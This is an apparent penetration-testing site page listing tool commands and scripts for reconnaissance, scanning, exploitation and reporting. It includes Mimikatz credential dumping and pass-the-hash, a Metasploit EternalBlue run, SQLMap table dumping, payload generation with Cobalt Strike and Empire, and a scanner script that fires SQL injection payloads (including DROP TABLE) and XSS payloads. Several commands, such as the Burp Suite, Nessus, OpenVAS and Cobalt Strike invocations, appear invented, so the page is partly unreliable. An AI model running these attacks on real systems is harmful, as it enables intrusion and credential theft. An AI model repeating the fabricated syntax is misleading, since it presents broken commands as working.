---
layout: default
title: Tools & Automation
permalink: /tools/
---

# Security Testing Tools & Automation

A comprehensive collection of tools, scripts, and automation frameworks for effective penetration testing and vulnerability assessment.

## 🛠️ Tool Categories

### Reconnaissance Tools
### Vulnerability Scanners
### Exploitation Frameworks
### Post-Exploitation Tools
### Reporting & Documentation
### Automation Scripts

---

## 🔍 Reconnaissance Tools {#reconnaissance-tools}

### Subdomain Enumeration

#### Subfinder
```bash
# Basic subdomain enumeration
subfinder -d example.com -o subdomains.txt

# Multiple domains
subfinder -dL domains.txt -o subdomains.txt

# With API keys for better results
subfinder -d example.com -o subdomains.txt -config config.yaml

# Verbose output
subfinder -d example.com -v -o subdomains.txt
```

#### Assetfinder
```bash
# Basic asset discovery
assetfinder example.com > assets.txt

# Include subdomains
assetfinder -subs-only example.com > subdomains.txt

# Multiple domains
assetfinder -subs-only -dL domains.txt > all_subs.txt
```

#### Amass
```bash
# Passive enumeration
amass enum -passive -d example.com -o amass_passive.txt

# Active enumeration
amass enum -active -d example.com -o amass_active.txt

# With wordlist
amass enum -wordlist /path/to/wordlist.txt -d example.com

# DNS brute forcing
amass enum -brute -d example.com -w /path/to/wordlist.txt
```

### Port Scanning

#### Nmap
```bash
# Basic port scan
nmap -sS -O -A target.com

# Stealth scan
nmap -sS -f -D RND:10 target.com

# UDP scan
nmap -sU -p 1-65535 target.com

# Service version detection
nmap -sV -sC target.com

# Vulnerability scanning
nmap --script vuln target.com

# Custom script scanning
nmap --script custom-script.nse target.com
```

#### Masscan
```bash
# Fast port scanning
masscan -p1-65535 192.168.1.0/24 --rate=1000

# Specific ports
masscan -p80,443,22,21 192.168.1.0/24

# Output to file
masscan -p1-65535 192.168.1.0/24 -oG masscan.txt
```

### DNS Analysis

#### DNSRecon
```bash
# Basic DNS enumeration
dnsrecon -d example.com

# Zone transfer attempt
dnsrecon -d example.com -t axfr

# Reverse DNS lookup
dnsrecon -r 192.168.1.0/24

# Brute force subdomains
dnsrecon -d example.com -t brt -D /path/to/wordlist.txt
```

#### Dig
```bash
# Basic DNS query
dig example.com

# Specific record types
dig example.com MX
dig example.com TXT
dig example.com NS

# Reverse DNS lookup
dig -x 192.168.1.1

# DNS over HTTPS
dig @1.1.1.1 example.com
```

---

## 🔎 Vulnerability Scanners {#vulnerability-scanners}

### Web Application Scanners

#### OWASP ZAP
```bash
# Basic scan
zap-cli quick-scan --spider --ajax-spider https://example.com

# Full scan
zap-cli full-scan --spider --ajax-spider https://example.com

# Custom scan
zap-cli scan --spider --ajax-spider --scanners xss,sqli https://example.com

# API scan
zap-cli api-scan --api-url https://api.example.com --api-key your-key
```

#### Burp Suite
```bash
# Command line scanning
burpsuite --scan-target https://example.com

# Custom configuration
burpsuite --config-file custom-config.json --scan-target https://example.com

# API scanning
burpsuite --api-scan --api-url https://api.example.com
```

#### Nikto
```bash
# Basic scan
nikto -h https://example.com

# Multiple hosts
nikto -h https://example.com -h https://target2.com

# Custom plugins
nikto -h https://example.com -Plugins "apache_expect_xss"

# Output to file
nikto -h https://example.com -o nikto_results.txt
```

### Network Scanners

#### Nessus
```bash
# Basic scan
nessus-cli scan --target https://example.com

# Custom policy
nessus-cli scan --policy "Web Application Scan" --target https://example.com

# Scheduled scan
nessus-cli scan --schedule "daily" --target https://example.com
```

#### OpenVAS
```bash
# Basic scan
openvas-cli scan --target https://example.com

# Custom configuration
openvas-cli scan --config "Full and fast" --target https://example.com

# Report generation
openvas-cli report --format PDF --scan-id scan-id
```

### Infrastructure Scanners

#### SSL Labs API
```bash
# SSL configuration test
curl -s "https://api.ssllabs.com/api/v3/analyze?host=example.com"

# Certificate analysis
curl -s "https://api.ssllabs.com/api/v3/getCertChain?host=example.com"
```

#### DNS Security Tools
```bash
# SPF record check
dig TXT example.com | grep -i spf

# DKIM record check
dig TXT default._domainkey.example.com

# DMARC record check
dig TXT _dmarc.example.com
```

---

## ⚡ Exploitation Frameworks {#exploitation-frameworks}

### Web Exploitation

#### SQLMap
```bash
# Basic SQL injection test
sqlmap -u "https://example.com/page.php?id=1"

# POST request testing
sqlmap -u "https://example.com/login.php" --data "username=admin&password=admin"

# Cookie-based testing
sqlmap -u "https://example.com/page.php?id=1" --cookie "session=abc123"

# Database enumeration
sqlmap -u "https://example.com/page.php?id=1" --dbs

# Table enumeration
sqlmap -u "https://example.com/page.php?id=1" -D database_name --tables

# Data extraction
sqlmap -u "https://example.com/page.php?id=1" -D database_name -T table_name --dump
```

#### XSSer
```bash
# Basic XSS test
xsser --url="https://example.com/page.php?param=test"

# POST request testing
xsser --url="https://example.com/login.php" --data="username=admin&password=admin"

# Cookie-based testing
xsser --url="https://example.com/page.php?param=test" --cookie="session=abc123"

# Custom payloads
xsser --url="https://example.com/page.php?param=test" --payload="<script>alert('XSS')</script>"
```

### Network Exploitation

#### Metasploit
```bash
# Start Metasploit
msfconsole

# Search for exploits
search type:exploit platform:windows

# Use specific exploit
use exploit/windows/smb/ms17_010_eternalblue

# Set target
set RHOSTS 192.168.1.100

# Execute exploit
exploit
```

#### Cobalt Strike
```bash
# Start team server
./teamserver 192.168.1.100 password

# Connect client
./cobaltstrike

# Generate payload
./cobaltstrike --generate-payload windows/beacon_http/reverse_http
```

### Post-Exploitation

#### PowerShell Empire
```bash
# Start Empire server
./empire

# Start Empire client
./empire --client

# Generate stager
usestager windows/launcher_bat

# Set listener
set Listener http

# Generate payload
execute
```

#### Mimikatz
```bash
# Extract credentials
mimikatz.exe "sekurlsa::logonpasswords" exit

# Extract tickets
mimikatz.exe "sekurlsa::tickets" exit

# Pass-the-hash
mimikatz.exe "sekurlsa::pth /user:admin /domain:example.com /ntlm:hash" exit
```

---

## 📊 Reporting & Documentation {#reporting-documentation}

### Report Generation Tools

#### Custom Reporting Scripts
```python
#!/usr/bin/env python3
"""
Custom vulnerability report generator
"""

import json
import csv
import pdfkit
from datetime import datetime

class VulnerabilityReporter:
    def __init__(self, findings_file):
        self.findings = self.load_findings(findings_file)
        self.report_data = self.generate_report_data()
    
    def load_findings(self, file_path):
        """Load vulnerability findings from file"""
        with open(file_path, 'r') as f:
            return json.load(f)
    
    def generate_report_data(self):
        """Generate report data structure"""
        return {
            'title': 'Vulnerability Assessment Report',
            'date': datetime.now().strftime('%Y-%m-%d'),
            'findings': self.findings,
            'summary': self.generate_summary()
        }
    
    def generate_summary(self):
        """Generate executive summary"""
        critical = len([f for f in self.findings if f['severity'] == 'Critical'])
        high = len([f for f in self.findings if f['severity'] == 'High'])
        medium = len([f for f in self.findings if f['severity'] == 'Medium'])
        low = len([f for f in self.findings if f['severity'] == 'Low'])
        
        return {
            'total_findings': len(self.findings),
            'critical': critical,
            'high': high,
            'medium': medium,
            'low': low
        }
    
    def generate_html_report(self, output_file):
        """Generate HTML report"""
        html_template = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>{title}</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 40px; }}
                .header {{ background-color: #f0f0f0; padding: 20px; border-radius: 5px; }}
                .summary {{ margin: 20px 0; }}
                .finding {{ margin: 20px 0; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }}
                .critical {{ border-left: 5px solid #ff0000; }}
                .high {{ border-left: 5px solid #ff6600; }}
                .medium {{ border-left: 5px solid #ffcc00; }}
                .low {{ border-left: 5px solid #00cc00; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>{title}</h1>
                <p>Generated on: {date}</p>
            </div>
            
            <div class="summary">
                <h2>Executive Summary</h2>
                <p>Total Findings: {total_findings}</p>
                <p>Critical: {critical} | High: {high} | Medium: {medium} | Low: {low}</p>
            </div>
            
            <div class="findings">
                <h2>Vulnerability Findings</h2>
                {findings_html}
            </div>
        </body>
        </html>
        """
        
        findings_html = ""
        for finding in self.findings:
            findings_html += f"""
            <div class="finding {finding['severity'].lower()}">
                <h3>{finding['title']}</h3>
                <p><strong>Severity:</strong> {finding['severity']}</p>
                <p><strong>Description:</strong> {finding['description']}</p>
                <p><strong>Impact:</strong> {finding['impact']}</p>
                <p><strong>Remediation:</strong> {finding['remediation']}</p>
            </div>
            """
        
        html_content = html_template.format(
            title=self.report_data['title'],
            date=self.report_data['date'],
            total_findings=self.report_data['summary']['total_findings'],
            critical=self.report_data['summary']['critical'],
            high=self.report_data['summary']['high'],
            medium=self.report_data['summary']['medium'],
            low=self.report_data['summary']['low'],
            findings_html=findings_html
        )
        
        with open(output_file, 'w') as f:
            f.write(html_content)
    
    def generate_pdf_report(self, output_file):
        """Generate PDF report"""
        html_file = output_file.replace('.pdf', '.html')
        self.generate_html_report(html_file)
        
        options = {
            'page-size': 'A4',
            'margin-top': '0.75in',
            'margin-right': '0.75in',
            'margin-bottom': '0.75in',
            'margin-left': '0.75in',
            'encoding': "UTF-8",
            'no-outline': None
        }
        
        pdfkit.from_file(html_file, output_file, options=options)
```

### Documentation Tools

#### Markdown Documentation
```markdown
# Vulnerability Report Template

## Executive Summary
- **Total Findings**: [Number]
- **Critical**: [Number]
- **High**: [Number]
- **Medium**: [Number]
- **Low**: [Number]

## Detailed Findings

### [Vulnerability Title]
- **Severity**: [Critical/High/Medium/Low]
- **CVSS Score**: [Score]
- **Description**: [Detailed description]
- **Impact**: [Business impact]
- **Remediation**: [Step-by-step remediation]

## Recommendations
- [Priority recommendations]
- [Long-term improvements]
- [Process improvements]
```

---

## 🤖 Automation Scripts {#automation-scripts}

### Reconnaissance Automation

#### Subdomain Enumeration Script
```bash
#!/bin/bash
# Comprehensive subdomain enumeration script

DOMAIN=$1
OUTPUT_DIR="recon_$DOMAIN"
mkdir -p $OUTPUT_DIR

echo "[+] Starting subdomain enumeration for $DOMAIN"

# Subfinder
echo "[+] Running Subfinder..."
subfinder -d $DOMAIN -o $OUTPUT_DIR/subfinder.txt

# Assetfinder
echo "[+] Running Assetfinder..."
assetfinder $DOMAIN > $OUTPUT_DIR/assetfinder.txt

# Amass
echo "[+] Running Amass..."
amass enum -passive -d $DOMAIN -o $OUTPUT_DIR/amass_passive.txt
amass enum -active -d $DOMAIN -o $OUTPUT_DIR/amass_active.txt

# Combine and deduplicate
cat $OUTPUT_DIR/*.txt | sort -u > $OUTPUT_DIR/all_subdomains.txt

echo "[+] Subdomain enumeration complete. Found $(wc -l < $OUTPUT_DIR/all_subdomains.txt) unique subdomains"
```

#### Port Scanning Script
```bash
#!/bin/bash
# Automated port scanning script

TARGETS_FILE=$1
OUTPUT_DIR="port_scan_results"
mkdir -p $OUTPUT_DIR

echo "[+] Starting port scanning for targets in $TARGETS_FILE"

while IFS= read -r target; do
    echo "[+] Scanning $target..."
    
    # Nmap scan
    nmap -sS -O -A $target -oA $OUTPUT_DIR/nmap_$target
    
    # Masscan for fast scanning
    masscan -p1-65535 $target --rate=1000 -oG $OUTPUT_DIR/masscan_$target.txt
    
done < $TARGETS_FILE

echo "[+] Port scanning complete"
```

### Vulnerability Scanning Automation

#### Web Application Scanning Script
```bash
#!/bin/bash
# Automated web application scanning

TARGETS_FILE=$1
OUTPUT_DIR="web_scan_results"
mkdir -p $OUTPUT_DIR

echo "[+] Starting web application scanning for targets in $TARGETS_FILE"

while IFS= read -r target; do
    echo "[+] Scanning $target..."
    
    # OWASP ZAP
    zap-cli quick-scan --spider --ajax-spider $target -o $OUTPUT_DIR/zap_$target.json
    
    # Nikto
    nikto -h $target -o $OUTPUT_DIR/nikto_$target.txt
    
    # Custom vulnerability scanner
    python custom_scanner.py --target $target --output $OUTPUT_DIR/custom_$target.json
    
done < $TARGETS_FILE

echo "[+] Web application scanning complete"
```

#### Network Vulnerability Scanning Script
```bash
#!/bin/bash
# Automated network vulnerability scanning

TARGETS_FILE=$1
OUTPUT_DIR="network_scan_results"
mkdir -p $OUTPUT_DIR

echo "[+] Starting network vulnerability scanning for targets in $TARGETS_FILE"

while IFS= read -r target; do
    echo "[+] Scanning $target..."
    
    # Nmap vulnerability scan
    nmap --script vuln $target -oA $OUTPUT_DIR/nmap_vuln_$target
    
    # Nessus scan (if available)
    nessus-cli scan --target $target --output $OUTPUT_DIR/nessus_$target.json
    
done < $TARGETS_FILE

echo "[+] Network vulnerability scanning complete"
```

### Report Generation Automation

#### Automated Report Generator
```bash
#!/bin/bash
# Automated vulnerability report generation

SCAN_RESULTS_DIR=$1
OUTPUT_DIR="reports"
mkdir -p $OUTPUT_DIR

echo "[+] Generating vulnerability reports from $SCAN_RESULTS_DIR"

# Generate HTML report
python vulnerability_reporter.py --input $SCAN_RESULTS_DIR --output $OUTPUT_DIR/report.html --format html

# Generate PDF report
python vulnerability_reporter.py --input $SCAN_RESULTS_DIR --output $OUTPUT_DIR/report.pdf --format pdf

# Generate CSV report
python vulnerability_reporter.py --input $SCAN_RESULTS_DIR --output $OUTPUT_DIR/report.csv --format csv

echo "[+] Report generation complete"
```

---

## 🔧 Custom Tool Development {#custom-tool-development}

### Python Security Tools

#### Custom Vulnerability Scanner
```python
#!/usr/bin/env python3
"""
Custom vulnerability scanner framework
"""

import requests
import json
import argparse
from urllib.parse import urljoin
from bs4 import BeautifulSoup

class VulnerabilityScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.vulnerabilities = []
    
    def scan_sql_injection(self):
        """Scan for SQL injection vulnerabilities"""
        payloads = [
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' OR 1=1--"
        ]
        
        for payload in payloads:
            try:
                response = self.session.get(
                    self.target_url,
                    params={'id': payload},
                    timeout=10
                )
                
                if self.detect_sql_error(response.text):
                    self.vulnerabilities.append({
                        'type': 'SQL Injection',
                        'payload': payload,
                        'url': response.url,
                        'severity': 'High'
                    })
            except requests.RequestException:
                continue
    
    def scan_xss(self):
        """Scan for XSS vulnerabilities"""
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>"
        ]
        
        for payload in payloads:
            try:
                response = self.session.get(
                    self.target_url,
                    params={'search': payload},
                    timeout=10
                )
                
                if payload in response.text:
                    self.vulnerabilities.append({
                        'type': 'XSS',
                        'payload': payload,
                        'url': response.url,
                        'severity': 'Medium'
                    })
            except requests.RequestException:
                continue
    
    def detect_sql_error(self, response_text):
        """Detect SQL error messages in response"""
        sql_errors = [
            'mysql_fetch_array',
            'ORA-01756',
            'Microsoft OLE DB Provider',
            'PostgreSQL query failed',
            'Warning: mysql_',
            'valid MySQL result',
            'MySqlClient.',
            'SQLServer JDBC Driver',
            'SQLException',
            'SQLite error'
        ]
        
        return any(error in response_text for error in sql_errors)
    
    def generate_report(self, output_file):
        """Generate vulnerability report"""
        report = {
            'target': self.target_url,
            'vulnerabilities': self.vulnerabilities,
            'total_findings': len(self.vulnerabilities)
        }
        
        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)

def main():
    parser = argparse.ArgumentParser(description='Custom Vulnerability Scanner')
    parser.add_argument('--target', required=True, help='Target URL to scan')
    parser.add_argument('--output', required=True, help='Output file for results')
    
    args = parser.parse_args()
    
    scanner = VulnerabilityScanner(args.target)
    scanner.scan_sql_injection()
    scanner.scan_xss()
    scanner.generate_report(args.output)
    
    print(f"Scan complete. Found {len(scanner.vulnerabilities)} vulnerabilities.")

if __name__ == '__main__':
    main()
```

### Bash Automation Scripts

#### Complete Penetration Testing Script
```bash
#!/bin/bash
# Complete penetration testing automation script

TARGET=$1
OUTPUT_DIR="pentest_$TARGET"
mkdir -p $OUTPUT_DIR

echo "[+] Starting complete penetration test for $TARGET"
echo "[+] Output directory: $OUTPUT_DIR"

# Phase 1: Reconnaissance
echo "[+] Phase 1: Reconnaissance"
./reconnaissance.sh $TARGET $OUTPUT_DIR/recon

# Phase 2: Vulnerability Assessment
echo "[+] Phase 2: Vulnerability Assessment"
./vulnerability_assessment.sh $TARGET $OUTPUT_DIR/vuln

# Phase 3: Exploitation
echo "[+] Phase 3: Exploitation"
./exploitation.sh $TARGET $OUTPUT_DIR/exploit

# Phase 4: Reporting
echo "[+] Phase 4: Reporting"
./reporting.sh $OUTPUT_DIR $OUTPUT_DIR/reports

echo "[+] Penetration test complete. Results saved to $OUTPUT_DIR"
```

---

## 📚 Tool Resources & References {#tool-resources}

### Official Documentation
- [OWASP ZAP Documentation](https://www.zaproxy.org/docs/)
- [Burp Suite Documentation](https://portswigger.net/burp/documentation)
- [Nmap Documentation](https://nmap.org/book/)
- [Metasploit Documentation](https://docs.metasploit.com/)

### Community Resources
- [Nuclei Templates](https://github.com/projectdiscovery/nuclei-templates)
- [Custom Wordlists](https://github.com/danielmiessler/SecLists)
- [Exploit Database](https://www.exploit-db.com/)
- [CVE Database](https://cve.mitre.org/)

### Training Resources
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Pentester Academy](https://www.pentesteracademy.com/)
- [Cybrary](https://www.cybrary.it/)
- [HackTheBox](https://www.hackthebox.eu/)

---

**Ready to start using these tools?** Choose the appropriate tools for your testing phase and begin your security assessment journey! 🎯